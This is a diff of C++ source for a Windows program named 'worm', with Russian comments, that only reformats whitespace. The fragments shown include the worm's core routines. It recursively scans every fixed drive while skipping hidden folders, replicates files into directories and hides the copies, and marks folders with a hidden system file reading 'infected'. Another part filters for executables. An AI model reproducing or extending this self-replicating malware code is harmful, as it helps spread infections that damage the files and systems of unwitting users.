@@ -222,55 +222,55 @@ void filter_only_exe(vector<fs::path>& files) { // фильтруем из вс�
 
 void worm::scan_all_volumes()  // поиск по всем корневым дискам, исключая съемные носители
 {
-     
-        auto volumes = get_all_volumes();
 
-        for (const auto& vol : volumes) {
-            auto paths = get_paths_for_volume(vol);
+    auto volumes = get_all_volumes();
 
-            for (const auto& path : paths) {
-                UINT driveType = GetDriveTypeW(path.c_str());
+    for (const auto& vol : volumes) {
+        auto paths = get_paths_for_volume(vol);
 
-                if (driveType == DRIVE_FIXED) { // только SSD/HDD, так как для флешек и прочих съемных носителей другая логика
-                    std::wcout << L"Обход: " << path << L"\n";
-                    search_list_dir(path, list_dir);
-                }
-                else {
-                    std::wcout << L"Пропущено (не HDD/SSD): " << path << L"\n";
-                }
+        for (const auto& path : paths) {
+            UINT driveType = GetDriveTypeW(path.c_str());
+
+            if (driveType == DRIVE_FIXED) { // только SSD/HDD, так как для флешек и прочих съемных носителей другая логика
+                std::wcout << L"Обход: " << path << L"\n";
+                search_list_dir(path, list_dir);
+            }
+            else {
+                std::wcout << L"Пропущено (не HDD/SSD): " << path << L"\n";
             }
         }
-    
+    }
+
 
 }
 
 void worm::search_list_dir(const wstring& path_to_dir, vector<wstring>& list_dir_tmp)// рекурсивный поиск всех подпапок по адрессу и внутри и копирование в выбранный вектор
 {
-     
-        error_code ec;
 
-        fs::directory_iterator it(path_to_dir, ec);
-        if (ec) {
-            wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
-            return;
+    error_code ec;
+
+    fs::directory_iterator it(path_to_dir, ec);
+    if (ec) {
+        wcerr << L"Ошибка доступа к " << path_to_dir << L": " << ec.message().c_str() << L"\n";
+        return;
+    }
+
+    for (const auto& entry : it) {
+        if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
+            std::wstring dir_path = entry.path().wstring();
+            list_dir_tmp.push_back(dir_path);
+            search_list_dir(dir_path, list_dir_tmp);  // рекурсия
         }
+    }
+    list_dir_tmp.push_back(path_to_dir);
 
-        for (const auto& entry : it) {
-            if (entry.is_directory(ec) && !ec && !is_hidden(entry.path())) {
-                std::wstring dir_path = entry.path().wstring();
-                list_dir_tmp.push_back(dir_path);
-                search_list_dir(dir_path, list_dir_tmp);  // рекурсия
-            }
-        }
-        list_dir_tmp.push_back(path_to_dir);
 
-    
 }
 
 void worm::search_list_dir() // для старта поиска по дирректориям
 {
     list_dir.clear();
-    
+
     search_list_dir(path_to_start, list_dir);
     //search_list_dir(L"E:\\test_worm", list_dir);//search_list_dir(path_to_start);//search_list_dir("F:\Anki\ChatExport_2025-04-07\video_files");
     //list_dir.push_back(path_to_start);
@@ -368,7 +368,7 @@ void worm::replicate_files(int iteration)
                     if (!SetFileAttributesW(copy_path.wstring().c_str(), new_attrs)) {
                         std::wcerr << L"Ошибка SetFileAttributesW: " << GetLastError() << L"\n";
                     }
-                    
+
                 }
                 else {
                     std::wcerr << L"Ошибка GetFileAttributesW: " << GetLastError() << L"\n";
@@ -504,7 +504,7 @@ bool worm::infected_dir(const wstring& dir_path)
     marker << "infected";
     marker.close();
     SetFileAttributes(full_name_to_file.c_str(), 0x2 | 0x4);
-    
+
     return true;
 }
 
@@ -615,7 +615,7 @@ void attach_console() {
     freopen_s(&fp, "CONOUT$", "w", stdout);
     freopen_s(&fp, "CONOUT$", "w", stderr);
     freopen_s(&fp, "CONIN$", "r", stdin);
-}
+} 
 
 
 
